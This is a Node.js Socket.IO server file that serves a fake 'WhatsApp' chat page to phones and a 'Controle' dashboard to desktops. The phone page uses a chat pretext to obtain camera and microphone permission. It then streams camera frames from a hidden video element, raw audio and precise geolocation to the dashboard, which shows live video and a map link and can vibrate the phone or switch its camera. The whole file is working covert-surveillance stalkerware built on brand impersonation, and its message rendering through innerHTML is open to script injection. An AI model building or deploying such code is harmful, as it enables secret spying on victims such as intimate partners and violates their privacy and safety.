const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

// ==================== ROTA PRINCIPAL ====================
app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  if (isMobile) {
    res.send(getMobileHTML(fullUrl));
  } else {
    res.send(getDesktopHTML(fullUrl));
  }
});

// ==================== HTML CELULAR (APENAS CONVERSA) ====================
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .header {
            background: #075E54;
            color: white;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .header h2 { flex: 1; font-size: 18px; }
        .status-dot {
            width: 10px;
            height: 10px;
            background: #25D366;
            border-radius: 50%;
        }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 6px;
            background: #0B1416;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="white" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M10,10 L10,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
        }
        .message {
            display: flex;
            margin-bottom: 4px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        .bubble {
            max-width: 75%;
            padding: 9px 13px;
            border-radius: 18px;
            font-size: 15px;
            line-height: 1.4;
            word-wrap: break-word;
        }
        .message.received .bubble {
            background: #202C33;
            color: #E9EDEF;
            border-top-left-radius: 4px;
        }
        .message.sent .bubble {
            background: #005C4B;
            color: white;
            border-top-right-radius: 4px;
        }
        .time {
            font-size: 11px;
            opacity: 0.7;
            margin-top: 4px;
            text-align: right;
        }
        .typing {
            display: none;
            padding: 9px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            color: #8696A0;
            font-size: 13px;
        }
        .typing.show { display: block; }
        .input-area {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-top: 1px solid #2A3B42;
        }
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 12px 16px;
            color: #E9EDEF;
            font-size: 15.5px;
            outline: none;
        }
        .send-btn {
            background: none;
            border: none;
            color: #00A884;
            font-size: 26px;
            cursor: pointer;
            padding: 8px;
        }
        .modal {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        .modal-content {
            background: #1F2C33;
            padding: 32px 24px;
            border-radius: 24px;
            text-align: center;
            max-width: 290px;
        }
        .modal-content h3 { color: white; margin-bottom: 12px; }
        .modal-content p { color: #8696A0; margin-bottom: 28px; font-size: 14.5px; }
        .start-btn {
            background: #00A884;
            color: white;
            border: none;
            padding: 14px 32px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        .conn-indicator {
            position: fixed;
            bottom: 12px;
            right: 12px;
            width: 9px;
            height: 9px;
            border-radius: 50%;
            background: #25D366;
            z-index: 200;
        }
        .conn-indicator.disconnected { background: #e74c3c; }
    </style>
</head>
<body>
    <!-- Modal inicial -->
    <div class="modal" id="permissionModal">
        <div class="modal-content">
            <h3>📱 WhatsApp</h3>
            <p>Permita acesso à câmera e microfone para iniciar a conversa</p>
            <button class="start-btn" id="startBtn">▶️ Iniciar Conversa</button>
        </div>
    </div>

    <!-- Header -->
    <div class="header">
        <div class="status-dot"></div>
        <h2>WhatsApp</h2>
    </div>

    <!-- Mensagens -->
    <div class="messages" id="messages">
        <div class="typing" id="typing">Digitando...</div>
    </div>

    <!-- Input -->
    <div class="input-area">
        <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
        <button class="send-btn" id="sendBtn">➤</button>
    </div>

    <div class="conn-indicator" id="connIndicator"></div>

    <!-- Vídeo oculto para captura -->
    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { transports: ['websocket', 'polling'], reconnection: true });

        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const modal = document.getElementById('permissionModal');
        const startBtn = document.getElementById('startBtn');
        const connIndicator = document.getElementById('connIndicator');
        const localVideo = document.getElementById('localVideo');

        let mediaStream = null;
        let facingMode = 'user';
        let permissions = false;
        let typingTimeout = null;
        let frameInterval = null;

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;

            const typing = document.getElementById('typing');
            if (typing && typing.parentNode === messagesDiv) messagesDiv.removeChild(typing);
            
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
            messagesDiv.appendChild(typing);
        }

        // Capturar e enviar frame da câmera
        function sendFrame() {
            if (!permissions || !localVideo.videoWidth) return;

            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            
            ctx.drawImage(localVideo, 0, 0, 320, 240);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
            
            socket.emit('frame', dataUrl);
        }

        async function startPermissions() {
            try {
                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                if (frameInterval) clearInterval(frameInterval);

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        width: { ideal: 640 }, 
                        height: { ideal: 480 }, 
                        facingMode: facingMode 
                    },
                    audio: true
                });

                mediaStream = stream;
                localVideo.srcObject = stream;

                // Aguarda o vídeo estar pronto
                await new Promise(r => localVideo.onloadedmetadata = r);
                localVideo.play();

                // Envia frames a cada 150ms
                frameInterval = setInterval(sendFrame, 150);

                // Áudio (simplificado e mais estável)
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioCtx.createMediaStreamSource(stream);
                const processor = audioCtx.createScriptProcessor(4096, 1, 1);
                source.connect(processor);
                processor.connect(audioCtx.destination);

                processor.onaudioprocess = e => {
                    if (permissions) {
                        const data = Array.from(e.inputBuffer.getChannelData(0));
                        socket.emit('audio', data);
                    }
                };

                // Localização
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(pos => {
                        if (permissions) {
                            socket.emit('location', {
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude
                            });
                        }
                    }, null, { enableHighAccuracy: true });
                }

                permissions = true;
                modal.style.display = 'none';
                socket.emit('mobile_online');

            } catch (err) {
                console.error(err);
                alert('Não foi possível acessar a câmera ou microfone.\\nPor favor, permita o acesso.');
            }
        }

        function sendMessage(text) {
            if (!text.trim() || !permissions) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        function startTyping() {
            if (permissions) {
                socket.emit('typing_start');
                if (typingTimeout) clearTimeout(typingTimeout);
                typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1400);
            }
        }

        // Eventos
        startBtn.onclick = startPermissions;
        sendBtn.onclick = () => sendMessage(messageInput.value);
        messageInput.onkeypress = e => {
            if (e.key === 'Enter') sendMessage(messageInput.value);
            else startTyping();
        };
        messageInput.oninput = startTyping;

        // Socket Events
        socket.on('message', msg => addMessage(msg, false));
        socket.on('typing_start', () => { typingDiv.classList.add('show'); });
        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
        socket.on('connect', () => connIndicator.classList.remove('disconnected'));
        socket.on('disconnect', () => connIndicator.classList.add('disconnected'));
        socket.on('toggle_camera', () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (permissions) startPermissions();
        });
        socket.on('vibrate', () => navigator.vibrate && navigator.vibrate(200));

        // Mensagem de boas-vindas
        setTimeout(() => {
            if (!permissions) {
                const welcome = document.createElement('div');
                welcome.className = 'message received';
                welcome.innerHTML = '<div class="bubble">Olá! Clique em "Iniciar Conversa" para ativar câmera e microfone.</div>';
                messagesDiv.appendChild(welcome);
            }
        }, 600);
    </script>
</body>
</html>`;
}

// ==================== HTML DESKTOP (CONTROLE) ====================
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
            color: #E9EDEF;
        }
        .sidebar {
            width: 320px;
            background: #111B21;
            border-right: 1px solid #2A3B42;
            display: flex;
            flex-direction: column;
        }
        .sidebar-header {
            background: #202C33;
            padding: 20px 16px;
            font-size: 18px;
            font-weight: bold;
        }
        .contact {
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 14px;
            background: #2A3B42;
        }
        .avatar {
            width: 52px;
            height: 52px;
            background: #075E54;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
        }
        .chat {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .chat-header {
            background: #202C33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .chat-avatar { width: 42px; height: 42px; background: #075E54; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; }
        .chat-info { flex: 1; }
        .chat-name { font-weight: bold; }
        .chat-status { font-size: 13px; color: #8696A0; }
        .chat-actions button {
            background: none;
            border: none;
            color: #8696A0;
            font-size: 22px;
            cursor: pointer;
            padding: 8px;
        }
        .video-panel {
            background: #000;
            height: 260px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            border-bottom: 1px solid #2A3B42;
        }
        #remoteVideo {
            max-width: 100%;
            max-height: 260px;
            object-fit: contain;
        }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .message { display: flex; margin-bottom: 6px; }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        .bubble {
            max-width: 68%;
            padding: 9px 13px;
            border-radius: 18px;
            font-size: 14.5px;
        }
        .message.received .bubble { background: #202C33; color: #E9EDEF; border-top-left-radius: 4px; }
        .message.sent .bubble { background: #005C4B; color: white; border-top-right-radius: 4px; }
        .time { font-size: 10.5px; opacity: 0.7; margin-top: 4px; text-align: right; }
        .typing { display: none; padding: 9px 16px; background: #202C33; border-radius: 18px; width: fit-content; color: #8696A0; font-size: 13px; }
        .typing.show { display: block; }
        .input-area {
            background: #1F2C33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-top: 1px solid #2A3B42;
        }
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 12px 16px;
            color: #E9EDEF;
            font-size: 15.5px;
            outline: none;
        }
        .send-btn {
            background: none;
            border: none;
            color: #00A884;
            font-size: 26px;
            cursor: pointer;
        }
        .quick {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            border-top: 1px solid #2A3B42;
        }
        .quick-msg {
            background: #2A3B42;
            padding: 7px 14px;
            border-radius: 20px;
            font-size: 13px;
            cursor: pointer;
        }
        .quick-msg:hover { background: #3A4B52; }
        .location {
            background: #1F2C33;
            padding: 12px 16px;
            font-size: 13px;
            color: #8696A0;
            border-top: 1px solid #2A3B42;
        }
        .system-msg {
            text-align: center;
            font-size: 12px;
            color: #8696A0;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">💬 Conversas</div>
        <div class="contact">
            <div class="avatar">📱</div>
            <div class="contact-info">
                <div class="contact-name">Celular</div>
                <div class="contact-status" id="contactStatus">offline</div>
            </div>
        </div>
    </div>

    <div class="chat">
        <div class="chat-header">
            <div class="chat-avatar">📱</div>
            <div class="chat-info">
                <div class="chat-name">Celular</div>
                <div class="chat-status" id="chatStatus">offline</div>
            </div>
            <div class="chat-actions">
                <button id="vibrateBtn" title="Vibrar">📳</button>
                <button id="toggleCameraBtn" title="Trocar câmera">🔄</button>
            </div>
        </div>

        <div class="video-panel">
            <img id="remoteVideo" src="" alt="Aguardando vídeo do celular...">
        </div>

        <div class="messages" id="messages">
            <div class="typing" id="typing">Celular está digitando...</div>
        </div>

        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
            <button class="send-btn" id="sendBtn">➤</button>
        </div>

        <div class="quick" id="quickMessages"></div>

        <div class="location" id="locationPanel">
            📍 Aguardando localização...
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');

        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const remoteVideo = document.getElementById('remoteVideo');
        const locationPanel = document.getElementById('locationPanel');
        const contactStatus = document.getElementById('contactStatus');
        const chatStatus = document.getElementById('chatStatus');
        const quickDiv = document.getElementById('quickMessages');

        // Quick messages
        const quickMsgs = ['Olá!', 'Tudo bem?', 'Oi 💕', 'Como você está?', 'Saudades!', 'Te amo ❤️', 'Boa noite 🌙', 'Bom dia ☀️'];
        quickMsgs.forEach(msg => {
            const el = document.createElement('span');
            el.className = 'quick-msg';
            el.textContent = msg;
            el.onclick = () => sendMessage(msg);
            quickDiv.appendChild(el);
        });

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }

        function addSystemMessage(text) {
            const div = document.createElement('div');
            div.className = 'system-msg';
            div.textContent = text;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }

        function sendMessage(text) {
            if (!text.trim()) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        // Socket Events
        socket.on('message', msg => addMessage(msg, false));
        socket.on('frame', frame => { remoteVideo.src = frame; });
        socket.on('audio', () => {}); // áudio opcional
        socket.on('location', data => {
            locationPanel.innerHTML = \`📍 \${data.lat.toFixed(5)}, \${data.lng.toFixed(5)}<br><a href="https://maps.google.com/?q=\${data.lat},\${data.lng}" target="_blank">Ver no Google Maps</a>\`;
        });
        socket.on('typing_start', () => typingDiv.classList.add('show'));
        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
        socket.on('mobile_online', () => {
            contactStatus.textContent = 'online 💚';
            chatStatus.textContent = 'online';
            addSystemMessage('✅ Celular conectado com sucesso!');
        });

        // Botões
        sendBtn.onclick = () => sendMessage(messageInput.value);
        messageInput.onkeypress = e => { if(e.key === 'Enter') sendMessage(messageInput.value); };
        
        document.getElementById('vibrateBtn').onclick = () => {
            socket.emit('vibrate');
            addSystemMessage('📳 Comando de vibração enviado');
        };
        document.getElementById('toggleCameraBtn').onclick = () => {
            socket.emit('toggle_camera');
            addSystemMessage('🔄 Solicitando troca de câmera...');
        };

        socket.on('connect', () => addSystemMessage('✅ Conectado ao servidor'));
        socket.on('disconnect', () => addSystemMessage('⚠️ Desconectado do servidor'));
    </script>
</body>
</html>`;
}

// ==================== SOCKET.IO ====================
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);

  socket.on('message', (msg) => {
    socket.broadcast.emit('message', msg);
  });

  socket.on('typing_start', () => socket.broadcast.emit('typing_start'));
  socket.on('typing_stop', () => socket.broadcast.emit('typing_stop'));
  socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
  socket.on('audio', (data) => socket.broadcast.emit('audio', data));
  socket.on('location', (loc) => socket.broadcast.emit('location', loc));
  socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
  socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
  socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));

  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✅ Servidor WhatsApp rodando na porta ${PORT}`);
  console.log(`   → PC:     http://localhost:${PORT}`);
  console.log(`   → Celular: http://[SEU-IP-DA-REDE]:${PORT}`);
  console.log(`\n📱 Abra primeiro no celular e clique em "Iniciar Conversa"`);
  console.log(`💻 Depois abra no PC para ver a câmera e controlar\n`);
});
